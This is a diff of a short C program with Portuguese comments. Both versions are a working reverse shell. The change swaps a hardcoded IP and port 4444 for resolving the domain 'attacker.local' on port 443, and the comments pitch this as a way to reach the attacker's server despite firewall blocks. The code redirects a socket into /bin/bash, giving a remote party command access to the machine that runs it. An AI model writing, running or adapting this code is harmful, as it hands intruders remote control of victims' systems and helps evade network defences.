@@ -1,36 +1,49 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <string.h>
+#include <netdb.h>
 #include <arpa/inet.h>
 #include <sys/socket.h>
-#include <string.h>
+
+// Esse código é um bypass de DNS, ele resolve o nome de domínio e conecta ao endereço IP
+// Ele é usado para conectar ao servidor de atacante, que pode estar em uma rede local ou na internet
+// Ele é uma alternativa ao DNS, que pode ser bloqueada por firewalls
+// Fornece flexibilidade para conectar ao servidor de atacante, mesmo que o domínio esteja bloqueado
 
 int main() {
-    int sock;
-    struct sockaddr_in alvo;
-    char *ip = "192.168.100.5";
-    int port = 4444;
+int rede;
+struct sockaddr_in atacante;
+struct hostent *host;
+char *dominio = "attacker.local"; // Mude para seu domínio real ou local
 
-    sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (sock == -1) {
-        printf("Erro ao criar socket\n");
-        return 1;   
-    }
+// Resolve o nome de domínio
+host = gethostbyname(dominio);
+if (host == NULL) {
+	fprintf(stderr, "Erro ao resolver domínio %s\n", dominio);
+	exit(1);
 
-    alvo.sin_family = AF_INET;
-    alvo.sin_port = htons(port);
-    alvo.sin_addr.s_addr = inet_addr(ip);
+}
+// Prepara conexão
+rede = socket(AF_INET, SOCK_STREAM, 0);
+if (rede < 0) {
+	perror("Erro ao criar socket");
+	exit(1);
 
-    if (connect(sock, (struct sockaddr *)&alvo, sizeof(alvo)) < 0) {
-        printf("Erro ao conectar ao alvo\n");
-        return 1;
-    }
-    
-    dup2(sock, 0);
-    dup2(sock, 1);
-    dup2(sock, 2);
-    char *shell[] = {"/bin/bash", NULL};
-    execve(shell[0], shell, NULL);
+}
 
-    return 0;
+atacante.sin_family = AF_INET;
+atacante.sin_port = htons(443);
+atacante.sin_addr = *((struct in_addr *) host->h_addr);
+// Conecta ao endereço resolvido
+
+if (connect(rede, (struct sockaddr *)&atacante, sizeof(atacante)) < 0) {
+	perror("Erro ao conectar");
+	exit(1);
+}
+
+dup2(rede, 0); dup2(rede, 1); dup2(rede, 2);
+
+execl("/bin/bash", "sh", NULL);
+
 }
